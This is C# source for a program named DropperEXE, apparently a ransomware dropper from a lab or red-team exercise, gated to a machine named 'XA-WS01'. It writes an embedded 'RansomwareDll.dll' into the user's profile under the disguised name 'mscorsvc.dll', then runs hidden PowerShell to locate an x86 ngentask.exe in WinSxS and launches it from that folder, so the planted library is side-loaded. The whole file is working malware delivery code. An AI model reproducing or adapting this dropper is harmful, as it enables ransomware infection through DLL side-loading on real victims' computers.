using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;

namespace DropperEXE
{
    class Program
    {
        static void Main(string[] args)
        {
            // Only run if computer name is "XA-WS01"
            if (!string.Equals(Environment.MachineName, "XA-WS01", StringComparison.OrdinalIgnoreCase))
            {
                Console.WriteLine("Always be careful when debugging/running Ransomware!!!");
                Console.ReadLine();
                return;
            }

            // Load the current executing assembly (this EXE)
            var currentAssembly = Assembly.GetExecutingAssembly();

            // Embedded resource name: Namespace + filename (case-sensitive)
            const string resourceName = "DropperEXE.RansomwareDll.dll";

            using (var resourceStream = currentAssembly.GetManifestResourceStream(resourceName))
            {
                if (resourceStream == null)
                {
                    return;
                }

                string homeDir = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile);
                var dllPath = Path.Combine(homeDir, "mscorsvc.dll");

                using (var fileStream = File.Create(dllPath))
                {
                    resourceStream.CopyTo(fileStream);
                }
            }

            // PowerShell command to find x86 ngentask.exe files in WinSxS folder
            string psCommand = "Get-ChildItem -Path 'C:\\Windows\\WinSxS' -Recurse -Filter 'ngentask.exe' -ErrorAction SilentlyContinue | " +
                               "Where-Object { $_.FullName -like '*x86*' } | Select-Object -ExpandProperty FullName";

            var psi = new ProcessStartInfo()
            {
                FileName = "powershell.exe",
                Arguments = $"-NoProfile -Command \"{psCommand}\"",
                RedirectStandardOutput = true,
                UseShellExecute = false,
                CreateNoWindow = true
            };

            try
            {
                using (var proc = Process.Start(psi))
                {
                    if (proc == null)
                    {
                        return;
                    }

                    // Read all lines of output
                    string ngentaskPath = null;
                    while (!proc.StandardOutput.EndOfStream)
                    {
                        ngentaskPath = proc.StandardOutput.ReadLine();
                        if (!string.IsNullOrEmpty(ngentaskPath))
                        {                            
                            // Start the vulnerable executable
                            var psi2 = new ProcessStartInfo()
                            {
                                FileName = "powershell.exe",
                                Arguments = $" -Command \"{ngentaskPath}\"",
                                RedirectStandardOutput = true,
                                UseShellExecute = false,
                                CreateNoWindow = true,
                                WorkingDirectory = Environment.GetFolderPath(Environment.SpecialFolder.UserProfile)
                            };
                            Process.Start(psi2);
                            break;
                        }
                    }
                    proc.WaitForExit();
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex);
            }
        }
    }
}
